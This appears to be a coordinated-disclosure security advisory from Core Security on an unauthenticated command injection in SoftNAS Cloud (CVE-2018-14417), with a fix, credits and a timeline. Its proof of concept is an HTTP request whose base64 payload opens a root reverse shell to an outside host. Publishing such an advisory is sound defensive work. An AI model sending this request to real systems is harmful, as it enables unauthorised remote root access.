@@ -1,0 +1,168 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+SoftNAS Cloud OS Command Injection
+
+1. *Advisory Information*
+
+Title: SoftNAS Cloud OS Command Injection
+Advisory ID: CORE-2018-0009
+Advisory URL:
+http://www.coresecurity.com/advisories/softnas-cloud-OS-command-injection
+Date published: 2018-07-26
+Date of last update: 2018-05-28
+Vendors contacted: SoftNAS
+Release mode: Coordinated release
+
+2. *Vulnerability Information*
+
+Class:  Improper Neutralization of Special Elements used in an OS
+Command [CWE-78]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: Yes
+CVE Name: CVE-2018-14417
+
+3. *Vulnerability Description*
+
+SoftNAS' website states that:
+
+[1] SoftNAS Cloud is a software-defined NAS filer delivered as a virtual
+storage appliance that runs within public, private or hybrid clouds.
+SoftNAS Cloud provides enterprise-grade NAS capabilities, including
+encryption, snapshots, rapid rollbacks, and cross-zone high-availability
+with automatic failover.
+
+A command injection vulnerability was found in the web administration
+console. In particular, snserv script did not sanitize some input
+parameters before executing a system command.
+
+4. *Vulnerable Packages*
+
+. SoftNAS Cloud versions prior to 4.0.3
+Other products and versions might be affected, but they were not tested.
+
+
+5. *Vendor Information, Solutions and Workarounds*
+
+SoftNAS released SoftNAS Cloud 4.0.3 that addresses the reported
+vulnerability. The software update can be performed via the
+StorageCenter admin UI in the product.
+For more information on the updating process see:
+https://www.softnas.com/docs/softnas/v3/html/updating_to_the_latest_version.html.
+
+In addition, SoftNAS published the following release note:
+https://docs.softnas.com/display/SD/Release+Notes
+
+6. *Credits*
+
+The vulnerability was discovered and researched by Fernando Diaz and
+Fernando Catoira from Core Security Consulting Services. The publication
+of this advisory was coordinated by Leandro Cuozzo from Core Advisories
+Team.
+
+7. *Technical Description / Proof of Concept Code*
+
+7.1. *Check and execute update functionality abuse leading to command
+execution*
+[CVE-2018-14417]
+The 'recentVersion' parameter from the snserv endpoint is vulnerable to
+OS Command Injection when check and execute update operations are
+performed.
+This endpoint has no authentication/session verification. Therefore, it
+is possible for an unauthenticated attacker to execute malicious code in
+the target server. As the WebServer runs a Sudoer user (apache), the
+malicious code can be executed with root permissions.
+
+The following part of the /etc/sudoers file shows the apache user
+capabilities.
+
+/-----
+User_Alias      APACHE = apache
+# Once SoftNAS UI is operational, only allow the specific command that
+require sudo access!!
+Cmnd_Alias      SOFTNAS = ALL
+APACHE  ALL = (ALL) NOPASSWD: SOFTNAS
+-----/
+
+The following proof of concept generates a remote shell on the target
+system as root:
+
+/-----
+GET
+/softnas/snserver/snserv.php?opcode=checkupdate&opcode=executeupdate&selectedupdate=3.6aaaaaaa.1aaaaaaaaaaaaaa&update_type=standard&recentVersions=3.6aaaaaaaaaaa.1aaaaaaa;echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4yLjQ1LjE4NS8xMjM0NSAwPiYx+|+base64+-d+|+sudo+bash;
+HTTP/1.1
+Host: 10.2.45.208
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0)
+Gecko/20100101 Firefox/59.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://10.2.45.208/softnas/applets/update/
+X-Requested-With: XMLHttpRequest
+Connection: close
+-----/
+
+As can be seen in the former request the payload had to be base64
+encoded as some special characters were not being properly decoded.
+
+8. *Report Timeline*
+2018-05-29: Core Security sent an initial notification to SoftNAS,
+including a draft advisory.
+2018-05-31: SoftNAS confirmed the reported vulnerability and informed
+they were working on a plan to fix the issue.
+2018-05-31: Core Security thanked the SoftNAS' reply.
+2018-06-15: Core Security requested a status update.
+2018-06-26: SoftNAS answered saying the fixed version was scheduled for
+late July.
+2018-06-26: Core Security thanked the update.
+2018-07-16: Core Security asked for a status update and requested a
+solidified release date.
+2018-07-16: SoftNAS informed that the new release version were under QA
+verification and they would have the release date during the week.
+2018-07-19: SoftNAS notified Core Security that SoftNAS Cloud 4.0.3
+version was already available.
+2018-07-19: Core Security thanked SoftNAS's update and set July 26th as
+the publication date.
+2018-07-26: Advisory CORE-2018-0009 published.
+
+9. *References*
+
+[1] https://www.softnas.com
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security, is charged with
+anticipating the future needs and requirements for information security
+technologies. We conduct our research in several important areas of
+computer security including system vulnerabilities, cyber attack
+planning and simulation, source code auditing, and cryptography. Our
+results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+11. *About Core Security*
+
+Core Security provides companies with the security insight they need to
+know who, how, and what is vulnerable in their organization. The
+company's threat-aware, identity & access, network security, and
+vulnerability management solutions provide actionable insight and
+context needed to manage security risks across the enterprise. This
+shared insight gives customers a comprehensive view of their security
+posture to make better security remediation decisions. Better insight
+allows organizations to prioritize their efforts to protect critical
+assets, take action sooner to mitigate access risk, and react faster if
+a breach does occur.
+
+Core Security is headquartered in the USA with offices and operations in
+South America, Europe, Middle East and Asia. To learn more, contact Core
+Security at (678) 304-4500 or info@coresecurity.com
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2018 Core Security and
+(c) 2018 CoreLabs, and are licensed under a Creative Commons Attribution
+Non-Commercial Share-Alike 3.0 (United States) License:
+http://creativecommons.org/licenses/by-nc-sa/3.0/us/
